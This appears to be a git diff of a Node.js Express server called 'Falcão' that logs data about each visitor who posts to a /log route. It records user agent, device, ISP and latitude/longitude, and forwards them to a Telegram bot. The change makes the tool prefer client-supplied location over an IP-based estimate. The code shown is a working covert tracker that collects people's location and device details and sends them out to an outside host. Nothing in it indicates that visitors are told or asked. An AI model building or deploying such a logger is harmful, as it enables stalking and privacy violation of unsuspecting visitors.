@@ -4,20 +4,17 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Variáveis do ambiente (.env)
+// Variáveis do ambiente (.env ou Render)
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 
-// Middlewares
 app.use(bodyParser.json());
 app.use(express.static('public'));
 
-// Página inicial
 app.get('/', (req, res) => {
   res.sendFile(__dirname + '/public/index.html');
 });
 
-// Rota que recebe dados do visitante
 app.post('/log', async (req, res) => {
   const data = req.body;
   console.log("📥 Dados recebidos:", data);
@@ -40,7 +37,7 @@ app.post('/log', async (req, res) => {
 🏢 ISP: ${ipInfo.org}
 🕵️‍♂️ Agente: ${data.userAgent}
 📱 Dispositivo: ${data.device}
-🔗 Lat/Long: ${ipInfo.loc}
+📌 Lat/Long: ${data.loc || ipInfo.loc}
 `;
 
     const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -66,7 +63,6 @@ app.post('/log', async (req, res) => {
   }
 });
 
-// Inicia o servidor
 app.listen(PORT, () => {
   console.log(`🦅 Falcão rodando em: http://localhost:${PORT}`);
 });
